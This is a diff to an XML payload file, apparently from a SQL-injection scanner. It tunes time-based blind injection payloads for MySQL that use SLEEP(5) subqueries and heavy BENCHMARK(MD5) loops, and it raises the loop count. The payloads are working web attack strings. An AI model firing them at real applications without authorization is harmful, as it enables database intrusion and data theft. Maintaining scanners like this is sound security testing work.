@@ -21,7 +21,7 @@
         <!--面对表为空，或者false and sleep(5)这种情形-->
         <!--<payload value="'=(SELECT%201%20FROM%20(SELECT(SLEEP(5)))Gbqj)='"/>-->
         <payload value=".0=(select(0)from(select(sleep(5)))v)/*'=(select(0)from(select(sleep(5)))v)='%22=(select(0)from(select(sleep(5)))v)=%22*/"/>
-        <payload value=".0=BENCHMARK(18000000,MD5(1))/*'=BENCHMARK(18000000,MD5(1))='%22=BENCHMARK(18000000,MD5(1))=%22*/"/>
+        <payload value=".0=BENCHMARK(22000000,MD5(1))/*'=BENCHMARK(22000000,MD5(1))='%22=BENCHMARK(22000000,MD5(1))=%22*/"/>
     </dbms>
 
     <!-- Microsoft SQL Server -->
